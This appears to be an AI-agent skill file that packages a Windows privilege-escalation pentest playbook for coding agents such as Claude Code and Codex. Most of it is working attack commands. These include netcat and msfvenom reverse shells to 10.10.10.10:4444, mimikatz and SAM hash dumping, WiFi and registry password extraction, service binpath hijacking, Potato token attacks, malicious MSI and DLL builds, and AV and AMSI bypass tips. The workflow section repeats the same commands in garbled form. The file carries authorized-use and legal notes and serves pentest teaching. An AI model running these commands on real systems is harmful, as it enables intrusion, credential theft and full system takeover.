---
name: windows-privilege-escalation
description: "Windows Privilege Escalation workflow skill. Use this skill when the user needs Provide systematic methodologies for discovering and exploiting privilege escalation vulnerabilities on Windows systems during penetration testing engagements and the operator should preserve the upstream workflow, copied support files, and provenance before merging or handing off."
version: "0.0.1"
category: testing-security
tags: ["windows-privilege-escalation", "provide", "systematic", "methodologies", "for", "discovering", "and", "exploiting"]
complexity: advanced
risk: caution
tools: ["codex-cli", "claude-code", "cursor", "gemini-cli", "opencode"]
source: community
author: "zebbern"
date_added: "2026-04-15"
date_updated: "2026-04-19"
---

# Windows Privilege Escalation

## Overview

This public intake copy packages `plugins/antigravity-awesome-skills-claude/skills/windows-privilege-escalation` from `https://github.com/sickn33/antigravity-awesome-skills` into the native Omni Skills editorial shape without hiding its origin.

Use it when the operator needs the upstream workflow, support files, and repository context to stay intact while the public validator and private enhancer continue their normal downstream flow.

This intake keeps the copied upstream files intact and uses `metadata.json` plus `ORIGIN.md` as the provenance anchor for review.

> AUTHORIZED USE ONLY: Use this skill only for authorized security assessments, defensive validation, or controlled educational environments. # Windows Privilege Escalation

Imported source sections that did not map cleanly to the public headings are still preserved below or in the support files. Notable imported sections: Purpose, Inputs / Prerequisites, Outputs / Deliverables, Constraints and Limitations.

## When to Use This Skill

Use this section as the trigger filter. It should make the activation boundary explicit before the operator loads files, runs commands, or opens a pull request.

- This skill is applicable to execute the workflow or actions described in the overview.
- Use when the request clearly matches the imported source intent: Provide systematic methodologies for discovering and exploiting privilege escalation vulnerabilities on Windows systems during penetration testing engagements.
- Use when the operator should preserve upstream workflow detail instead of rewriting the process from scratch.
- Use when provenance needs to stay visible in the answer, PR, or review packet.
- Use when copied upstream references, examples, or scripts materially improve the answer.
- Use when the workflow should remain reviewable in the public intake repo before the private enhancer takes over.

## Operating Table

| Situation | Start here | Why it matters |
| --- | --- | --- |
| First-time use | `metadata.json` | Confirms repository, branch, commit, and imported path before touching the copied workflow |
| Provenance review | `ORIGIN.md` | Gives reviewers a plain-language audit trail for the imported source |
| Workflow execution | `SKILL.md` | Starts with the smallest copied file that materially changes execution |
| Supporting context | `SKILL.md` | Adds the next most relevant copied source file without loading the entire package |
| Handoff decision | `## Related Skills` | Helps the operator switch to a stronger native skill when the task drifts |

## Workflow

This workflow is intentionally editorial and operational at the same time. It keeps the imported source useful to the operator while still satisfying the public intake standards that feed the downstream enhancer flow.

1. System Enumeration #### Basic System Information `powershell # OS version and patches systeminfo | findstr /B /C:"OS Name" /C:"OS Version" wmic qfe # Architecture wmic os get osarchitecture echo %PROCESSORARCHITECTURE% # Environment variables set Get-ChildItem Env: | ft Key,Value # List drives wmic logicaldisk get caption,description,providername #### User Enumeration powershell # Current user whoami echo %USERNAME% # User privileges whoami /priv whoami /groups whoami /all # All users net user Get-LocalUser | ft Name,Enabled,LastLogon # User details net user administrator net user %USERNAME% # Local groups net localgroup net localgroup administrators Get-LocalGroupMember Administrators | ft Name,PrincipalSource #### Network Enumeration powershell # Network interfaces ipconfig /all Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address # Routing table route print Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric # ARP table arp -A # Active connections netstat -ano # Network shares net share # Domain Controllers nltest /DCLIST:DomainName #### Antivirus Enumeration powershell # Check AV products WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntivirusProduct Get displayName ### 2.
2. Credential Harvesting #### SAM and SYSTEM Files powershell # SAM file locations %SYSTEMROOT%\repair\SAM %SYSTEMROOT%\System32\config\RegBack\SAM %SYSTEMROOT%\System32\config\SAM # SYSTEM file locations %SYSTEMROOT%\repair\system %SYSTEMROOT%\System32\config\SYSTEM %SYSTEMROOT%\System32\config\RegBack\system # Extract hashes (from Linux after obtaining files) pwdump SYSTEM SAM > sam.txt samdump2 SYSTEM SAM -o sam.txt # Crack with John john --format=NT sam.txt #### HiveNightmare (CVE-2021-36934) powershell # Check vulnerability icacls C:\Windows\System32\config\SAM # Vulnerable if: BUILTIN\Users:(I)(RX) # Exploit with mimikatz mimikatz> token::whoami /full mimikatz> misc::shadowcopies mimikatz> lsadump::sam /system:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM /sam:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM #### Search for Passwords powershell # Search file contents findstr /SI /M "password" .xml .ini .txt findstr /si password .xml .ini .txt .config # Search registry reg query HKLM /f password /t REGSZ /s reg query HKCU /f password /t REGSZ /s # Windows Autologin credentials reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword" # PuTTY sessions reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" # VNC passwords reg query "HKCU\Software\ORL\WinVNC3\Password" reg query HKEYLOCALMACHINE\SOFTWARE\RealVNC\WinVNC4 /v password # Search for specific files dir /S /B pass.txt == pass.xml == cred == vnc == .config where /R C:\ .ini #### Unattend.xml Credentials powershell # Common locations C:\unattend.xml C:\Windows\Panther\Unattend.xml C:\Windows\Panther\Unattend\Unattend.xml C:\Windows\system32\sysprep.inf C:\Windows\system32\sysprep\sysprep.xml # Search for files dir /s sysprep.inf sysprep.xml unattend.xml 2>nul # Decode base64 password (Linux) echo "U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo=" | base64 -d #### WiFi Passwords powershell # List profiles netsh wlan show profile # Get cleartext password netsh wlan show profile <SSID> key=clear # Extract all WiFi passwords for /f "tokens=4 delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name=%a key=clear | findstr "SSID Cipher Key" | find /v "Number" & echo.) & @echo on #### PowerShell History powershell # View PowerShell history type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHosthistory.txt cat (Get-PSReadlineOption).HistorySavePath cat (Get-PSReadlineOption).HistorySavePath | sls passw ### 3.
3. Service Exploitation #### Incorrect Service Permissions powershell # Find misconfigured services accesschk.exe -uwcqv "Authenticated Users" /accepteula accesschk.exe -uwcqv "Everyone" /accepteula accesschk.exe -ucqv <servicename> # Look for: SERVICEALLACCESS, SERVICECHANGECONFIG # Exploit vulnerable service sc config <service> binpath= "C:\nc.exe -e cmd.exe 10.10.10.10 4444" sc stop <service> sc start <service> #### Unquoted Service Paths powershell # Find unquoted paths wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\Windows\\" wmic service get name,displayname,startmode,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """ # Exploit: Place malicious exe in path # For path: C:\Program Files\Some App\service.exe # Try: C:\Program.exe or C:\Program Files\Some.exe #### AlwaysInstallElevated powershell # Check if enabled reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated # Both must return 0x1 for vulnerability # Create malicious MSI msfvenom -p windows/x64/shellreversetcp LHOST=10.10.10.10 LPORT=4444 -f msi -o evil.msi # Install (runs as SYSTEM) msiexec /quiet /qn /i C:\evil.msi ### 4.
4. Token Impersonation #### Check Impersonation Privileges powershell # Look for these privileges whoami /priv # Exploitable privileges: # SeImpersonatePrivilege # SeAssignPrimaryTokenPrivilege # SeTcbPrivilege # SeBackupPrivilege # SeRestorePrivilege # SeCreateTokenPrivilege # SeLoadDriverPrivilege # SeTakeOwnershipPrivilege # SeDebugPrivilege #### Potato Attacks powershell # JuicyPotato (Windows Server 2019 and below) JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.10.10 4444 -e cmd.exe" -t # PrintSpoofer (Windows 10 and Server 2019) PrintSpoofer.exe -i -c cmd # RoguePotato RoguePotato.exe -r 10.10.10.10 -e "C:\nc.exe 10.10.10.10 4444 -e cmd.exe" -l 9999 # GodPotato GodPotato.exe -cmd "cmd /c whoami" ### 5.
5. Kernel Exploitation #### Find Kernel Vulnerabilities powershell # Use Windows Exploit Suggester systeminfo > systeminfo.txt python wes.py systeminfo.txt # Or use Watson (on target) Watson.exe # Or use Sherlock PowerShell script powershell.exe -ExecutionPolicy Bypass -File Sherlock.ps1 #### Common Kernel Exploits MS17-010 (EternalBlue) - Windows 7/2008/2003/XP MS16-032 - Secondary Logon Handle - 2008/7/8/10/2012 MS15-051 - Client Copy Image - 2003/2008/7 MS14-058 - TrackPopupMenu - 2003/2008/7/8.1 MS11-080 - afd.sys - XP/2003 MS10-015 - KiTrap0D - 2003/XP/2000 MS08-067 - NetAPI - 2000/XP/2003 CVE-2021-1732 - Win32k - Windows 10/Server 2019 CVE-2020-0796 - SMBGhost - Windows 10 CVE-2019-1388 - UAC Bypass - Windows 7/8/10/2008/2012/2016/2019 ### 6.
6. Additional Techniques #### DLL Hijacking powershell # Find missing DLLs with Process Monitor # Filter: Result = NAME NOT FOUND, Path ends with .dll # Compile malicious DLL # For x64: x8664-w64-mingw32-gcc windowsdll.c -shared -o evil.dll # For x86: i686-w64-mingw32-gcc windowsdll.c -shared -o evil.dll #### Runas with Saved Credentials powershell # List saved credentials cmdkey /list # Use saved credentials runas /savecred /user:Administrator "cmd.exe /k whoami" runas /savecred /user:WORKGROUP\Administrator "\\10.10.10.10\share\evil.exe" #### WSL Exploitation powershell # Check for WSL wsl whoami # Set root as default user wsl --default-user root # Or: ubuntu.exe config --default-user root # Spawn shell as root wsl whoami wsl python -c 'import os; os.system("/bin/bash")' `
7. Confirm the user goal, the scope of the imported workflow, and whether this skill is still the right router for the task.

### Imported Workflow Notes

#### Imported: Core Workflow

### 1. System Enumeration

#### Basic System Information
```powershell
# OS version and patches
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
wmic qfe

# Architecture
wmic os get osarchitecture
echo %PROCESSOR_ARCHITECTURE%

# Environment variables
set
Get-ChildItem Env: | ft Key,Value

# List drives
wmic logicaldisk get caption,description,providername
```

#### User Enumeration
```powershell
# Current user
whoami
echo %USERNAME%

# User privileges
whoami /priv
whoami /groups
whoami /all

# All users
net user
Get-LocalUser | ft Name,Enabled,LastLogon

# User details
net user administrator
net user %USERNAME%

# Local groups
net localgroup
net localgroup administrators
Get-LocalGroupMember Administrators | ft Name,PrincipalSource
```

#### Network Enumeration
```powershell
# Network interfaces
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address

# Routing table
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric

# ARP table
arp -A

# Active connections
netstat -ano

# Network shares
net share

# Domain Controllers
nltest /DCLIST:DomainName
```

#### Antivirus Enumeration
```powershell
# Check AV products
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntivirusProduct Get displayName
```

### 2. Credential Harvesting

#### SAM and SYSTEM Files
```powershell
# SAM file locations
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM

# SYSTEM file locations
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system

# Extract hashes (from Linux after obtaining files)
pwdump SYSTEM SAM > sam.txt
samdump2 SYSTEM SAM -o sam.txt

# Crack with John
john --format=NT sam.txt
```

#### HiveNightmare (CVE-2021-36934)
```powershell
# Check vulnerability
icacls C:\Windows\System32\config\SAM
# Vulnerable if: BUILTIN\Users:(I)(RX)

# Exploit with mimikatz
mimikatz> token::whoami /full
mimikatz> misc::shadowcopies
mimikatz> lsadump::sam /system:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM /sam:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM
```

#### Search for Passwords
```powershell
# Search file contents
findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config

# Search registry
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s

# Windows Autologin credentials
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword"

# PuTTY sessions
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"

# VNC passwords
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password

# Search for specific files
dir /S /B *pass*.txt == *pass*.xml == *cred* == *vnc* == *.config*
where /R C:\ *.ini
```

#### Unattend.xml Credentials
```powershell
# Common locations
C:\unattend.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\system32\sysprep.inf
C:\Windows\system32\sysprep\sysprep.xml

# Search for files
dir /s *sysprep.inf *sysprep.xml *unattend.xml 2>nul

# Decode base64 password (Linux)
echo "U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo=" | base64 -d
```

#### WiFi Passwords
```powershell
# List profiles
netsh wlan show profile

# Get cleartext password
netsh wlan show profile <SSID> key=clear

# Extract all WiFi passwords
for /f "tokens=4 delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name=%a key=clear | findstr "SSID Cipher Key" | find /v "Number" & echo.) & @echo on
```

#### PowerShell History
```powershell
# View PowerShell history
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```

### 3. Service Exploitation

#### Incorrect Service Permissions
```powershell
# Find misconfigured services
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv "Everyone" * /accepteula
accesschk.exe -ucqv <service_name>

# Look for: SERVICE_ALL_ACCESS, SERVICE_CHANGE_CONFIG

# Exploit vulnerable service
sc config <service> binpath= "C:\nc.exe -e cmd.exe 10.10.10.10 4444"
sc stop <service>
sc start <service>
```

#### Unquoted Service Paths
```powershell
# Find unquoted paths
wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\Windows\\"
wmic service get name,displayname,startmode,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """

# Exploit: Place malicious exe in path
# For path: C:\Program Files\Some App\service.exe
# Try: C:\Program.exe or C:\Program Files\Some.exe
```

#### AlwaysInstallElevated
```powershell
# Check if enabled
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# Both must return 0x1 for vulnerability

# Create malicious MSI
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f msi -o evil.msi

# Install (runs as SYSTEM)
msiexec /quiet /qn /i C:\evil.msi
```

### 4. Token Impersonation

#### Check Impersonation Privileges
```powershell
# Look for these privileges
whoami /priv

# Exploitable privileges:
# SeImpersonatePrivilege
# SeAssignPrimaryTokenPrivilege
# SeTcbPrivilege
# SeBackupPrivilege
# SeRestorePrivilege
# SeCreateTokenPrivilege
# SeLoadDriverPrivilege
# SeTakeOwnershipPrivilege
# SeDebugPrivilege
```

#### Potato Attacks
```powershell
# JuicyPotato (Windows Server 2019 and below)
JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.10.10 4444 -e cmd.exe" -t *

# PrintSpoofer (Windows 10 and Server 2019)
PrintSpoofer.exe -i -c cmd

# RoguePotato
RoguePotato.exe -r 10.10.10.10 -e "C:\nc.exe 10.10.10.10 4444 -e cmd.exe" -l 9999

# GodPotato
GodPotato.exe -cmd "cmd /c whoami"
```

### 5. Kernel Exploitation

#### Find Kernel Vulnerabilities
```powershell
# Use Windows Exploit Suggester
systeminfo > systeminfo.txt
python wes.py systeminfo.txt

# Or use Watson (on target)
Watson.exe

# Or use Sherlock PowerShell script
powershell.exe -ExecutionPolicy Bypass -File Sherlock.ps1
```

#### Common Kernel Exploits
```
MS17-010 (EternalBlue) - Windows 7/2008/2003/XP
MS16-032 - Secondary Logon Handle - 2008/7/8/10/2012
MS15-051 - Client Copy Image - 2003/2008/7
MS14-058 - TrackPopupMenu - 2003/2008/7/8.1
MS11-080 - afd.sys - XP/2003
MS10-015 - KiTrap0D - 2003/XP/2000
MS08-067 - NetAPI - 2000/XP/2003
CVE-2021-1732 - Win32k - Windows 10/Server 2019
CVE-2020-0796 - SMBGhost - Windows 10
CVE-2019-1388 - UAC Bypass - Windows 7/8/10/2008/2012/2016/2019
```

### 6. Additional Techniques

#### DLL Hijacking
```powershell
# Find missing DLLs with Process Monitor
# Filter: Result = NAME NOT FOUND, Path ends with .dll

# Compile malicious DLL
# For x64: x86_64-w64-mingw32-gcc windows_dll.c -shared -o evil.dll
# For x86: i686-w64-mingw32-gcc windows_dll.c -shared -o evil.dll
```

#### Runas with Saved Credentials
```powershell
# List saved credentials
cmdkey /list

# Use saved credentials
runas /savecred /user:Administrator "cmd.exe /k whoami"
runas /savecred /user:WORKGROUP\Administrator "\\10.10.10.10\share\evil.exe"
```

#### WSL Exploitation
```powershell
# Check for WSL
wsl whoami

# Set root as default user
wsl --default-user root
# Or: ubuntu.exe config --default-user root

# Spawn shell as root
wsl whoami
wsl python -c 'import os; os.system("/bin/bash")'
```

#### Imported: Purpose

Provide systematic methodologies for discovering and exploiting privilege escalation vulnerabilities on Windows systems during penetration testing engagements. This skill covers system enumeration, credential harvesting, service exploitation, token impersonation, kernel exploits, and various misconfigurations that enable escalation from standard user to Administrator or SYSTEM privileges.

## Examples

### Example 1: Ask for the upstream workflow directly

```text
Use @windows-privilege-escalation to handle <task>. Start from the copied upstream workflow, load only the files that change the outcome, and keep provenance visible in the answer.
```

**Explanation:** This is the safest starting point when the operator needs the imported workflow, but not the entire repository.

### Example 2: Ask for a provenance-grounded review

```text
Review @windows-privilege-escalation against metadata.json and ORIGIN.md, then explain which copied upstream files you would load first and why.
```

**Explanation:** Use this before review or troubleshooting when you need a precise, auditable explanation of origin and file selection.

### Example 3: Narrow the copied support files before execution

```text
Use @windows-privilege-escalation for <task>. Load only the copied references, examples, or scripts that change the outcome, and name the files explicitly before proceeding.
```

**Explanation:** This keeps the skill aligned with progressive disclosure instead of loading the whole copied package by default.

### Example 4: Build a reviewer packet

```text
Review @windows-privilege-escalation using the copied upstream files plus provenance, then summarize any gaps before merge.
```

**Explanation:** This is useful when the PR is waiting for human review and you want a repeatable audit packet.

### Imported Usage Notes

#### Imported: Examples

### Example 1: Service Binary Path Exploitation
```powershell
# Find vulnerable service
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
# Result: RW MyService SERVICE_ALL_ACCESS

# Check current config
sc qc MyService

# Stop service and change binary path
sc stop MyService
sc config MyService binpath= "C:\Users\Public\nc.exe 10.10.10.10 4444 -e cmd.exe"
sc start MyService

# Catch shell as SYSTEM
```

### Example 2: AlwaysInstallElevated Exploitation
```powershell
# Verify vulnerability
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# Both return: 0x1

# Generate payload (attacker machine)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f msi -o shell.msi

# Transfer and execute
msiexec /quiet /qn /i C:\Users\Public\shell.msi

# Catch SYSTEM shell
```

### Example 3: JuicyPotato Token Impersonation
```powershell
# Verify SeImpersonatePrivilege
whoami /priv
# SeImpersonatePrivilege Enabled

# Run JuicyPotato
JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c c:\users\public\nc.exe 10.10.10.10 4444 -e cmd.exe" -t * -c {F87B28F1-DA9A-4F35-8EC0-800EFCF26B83}

# Catch SYSTEM shell
```

### Example 4: Unquoted Service Path
```powershell
# Find unquoted path
wmic service get name,pathname | findstr /i /v """
# Result: C:\Program Files\Vuln App\service.exe

# Check write permissions
icacls "C:\Program Files\Vuln App"
# Result: Users:(W)

# Place malicious binary
copy C:\Users\Public\shell.exe "C:\Program Files\Vuln.exe"

# Restart service
sc stop "Vuln App"
sc start "Vuln App"
```

### Example 5: Credential Harvesting from Registry
```powershell
# Check for auto-logon credentials
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
# DefaultUserName: Administrator
# DefaultPassword: P@ssw0rd123

# Use credentials
runas /user:Administrator cmd.exe
# Or for remote: psexec \\target -u Administrator -p P@ssw0rd123 cmd
```

## Best Practices

Treat the generated public skill as a reviewable packaging layer around the upstream repository. The goal is to keep provenance explicit and load only the copied source material that materially improves execution.

- Keep the imported skill grounded in the upstream repository; do not invent steps that the source material cannot support.
- Prefer the smallest useful set of support files so the workflow stays auditable and fast to review.
- Keep provenance, source commit, and imported file paths visible in notes and PR descriptions.
- Point directly at the copied upstream files that justify the workflow instead of relying on generic review boilerplate.
- Treat generated examples as scaffolding; adapt them to the concrete task before execution.
- Route to a stronger native skill when architecture, debugging, design, or security concerns become dominant.



## Troubleshooting

### Problem: The operator skipped the imported context and answered too generically

**Symptoms:** The result ignores the upstream workflow in `plugins/antigravity-awesome-skills-claude/skills/windows-privilege-escalation`, fails to mention provenance, or does not use any copied source files at all.
**Solution:** Re-open `metadata.json`, `ORIGIN.md`, and the most relevant copied upstream files. Load only the files that materially change the answer, then restate the provenance before continuing.

### Problem: The imported workflow feels incomplete during review

**Symptoms:** Reviewers can see the generated `SKILL.md`, but they cannot quickly tell which references, examples, or scripts matter for the current task.
**Solution:** Point at the exact copied references, examples, scripts, or assets that justify the path you took. If the gap is still real, record it in the PR instead of hiding it.

### Problem: The task drifted into a different specialization

**Symptoms:** The imported skill starts in the right place, but the work turns into debugging, architecture, design, security, or release orchestration that a native skill handles better.
**Solution:** Use the related skills section to hand off deliberately. Keep the imported provenance visible so the next skill inherits the right context instead of starting blind.

### Imported Troubleshooting Notes

#### Imported: Troubleshooting

| Issue | Cause | Solution |
|-------|-------|----------|
| Exploit fails (AV detected) | AV blocking known exploits | Use obfuscated exploits; living-off-the-land (mshta, certutil); custom compiled binaries |
| Service won't start | Binary path syntax | Ensure space after `=` in binpath: `binpath= "C:\path\binary.exe"` |
| Token impersonation fails | Wrong privilege/version | Check `whoami /priv`; verify Windows version compatibility |
| Can't find kernel exploit | System patched | Run Windows Exploit Suggester: `python wes.py systeminfo.txt` |
| PowerShell blocked | Execution policy/AMSI | Use `powershell -ep bypass -c "cmd"` or `-enc <base64>` |

## Related Skills

- `@00-andruia-consultant-v2` - Use when the work is better handled by that native specialization after this imported skill establishes context.
- `@10-andruia-skill-smith-v2` - Use when the work is better handled by that native specialization after this imported skill establishes context.
- `@20-andruia-niche-intelligence-v2` - Use when the work is better handled by that native specialization after this imported skill establishes context.
- `@3d-web-experience-v2` - Use when the work is better handled by that native specialization after this imported skill establishes context.

## Additional Resources

Use this support matrix and the linked files below as the operator packet for this imported skill. They should reflect real copied source material, not generic scaffolding.

| Resource family | What it gives the reviewer | Example path |
| --- | --- | --- |
| `references` | copied reference notes, guides, or background material from upstream | `references/n/a` |
| `examples` | worked examples or reusable prompts copied from upstream | `examples/n/a` |
| `scripts` | upstream helper scripts that change execution or validation | `scripts/n/a` |
| `agents` | routing or delegation notes that are genuinely part of the imported package | `agents/n/a` |
| `assets` | supporting assets or schemas copied from the source package | `assets/n/a` |



### Imported Reference Notes

#### Imported: Quick Reference

### Enumeration Tools

| Tool | Command | Purpose |
|------|---------|---------|
| WinPEAS | `winPEAS.exe` | Comprehensive enumeration |
| PowerUp | `Invoke-AllChecks` | Service/path vulnerabilities |
| Seatbelt | `Seatbelt.exe -group=all` | Security audit checks |
| Watson | `Watson.exe` | Missing patches |
| JAWS | `.\jaws-enum.ps1` | Legacy Windows enum |
| PrivescCheck | `Invoke-PrivescCheck` | Privilege escalation checks |

### Default Writable Folders

```
C:\Windows\Temp
C:\Windows\Tasks
C:\Users\Public
C:\Windows\tracing
C:\Windows\System32\spool\drivers\color
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
```

### Common Privilege Escalation Vectors

| Vector | Check Command |
|--------|---------------|
| Unquoted paths | `wmic service get pathname \| findstr /i /v """` |
| Weak service perms | `accesschk.exe -uwcqv "Everyone" *` |
| AlwaysInstallElevated | `reg query HKCU\...\Installer /v AlwaysInstallElevated` |
| Stored credentials | `cmdkey /list` |
| Token privileges | `whoami /priv` |
| Scheduled tasks | `schtasks /query /fo LIST /v` |

### Impersonation Privilege Exploits

| Privilege | Tool | Usage |
|-----------|------|-------|
| SeImpersonatePrivilege | JuicyPotato | CLSID abuse |
| SeImpersonatePrivilege | PrintSpoofer | Spooler service |
| SeImpersonatePrivilege | RoguePotato | OXID resolver |
| SeBackupPrivilege | robocopy /b | Read protected files |
| SeRestorePrivilege | Enable-SeRestorePrivilege | Write protected files |
| SeTakeOwnershipPrivilege | takeown.exe | Take file ownership |

#### Imported: Inputs / Prerequisites

- **Initial Access**: Shell or RDP access as standard user on Windows system
- **Enumeration Tools**: WinPEAS, PowerUp, Seatbelt, or manual commands
- **Exploit Binaries**: Pre-compiled exploits or ability to transfer tools
- **Knowledge**: Understanding of Windows security model and privileges
- **Authorization**: Written permission for penetration testing activities

#### Imported: Outputs / Deliverables

- **Privilege Escalation Path**: Identified vector to higher privileges
- **Credential Dump**: Harvested passwords, hashes, or tokens
- **Elevated Shell**: Command execution as Administrator or SYSTEM
- **Vulnerability Report**: Documentation of misconfigurations and exploits
- **Remediation Recommendations**: Fixes for identified weaknesses

#### Imported: Constraints and Limitations

### Operational Boundaries
- Kernel exploits may cause system instability
- Some exploits require specific Windows versions
- AV/EDR may detect and block common tools
- Token impersonation requires service account context
- Some techniques require GUI access

### Detection Considerations
- Credential dumping triggers security alerts
- Service modification logged in Event Logs
- PowerShell execution may be monitored
- Known exploit signatures detected by AV

### Legal Requirements
- Only test systems with written authorization
- Document all escalation attempts
- Avoid disrupting production systems
- Report all findings through proper channels
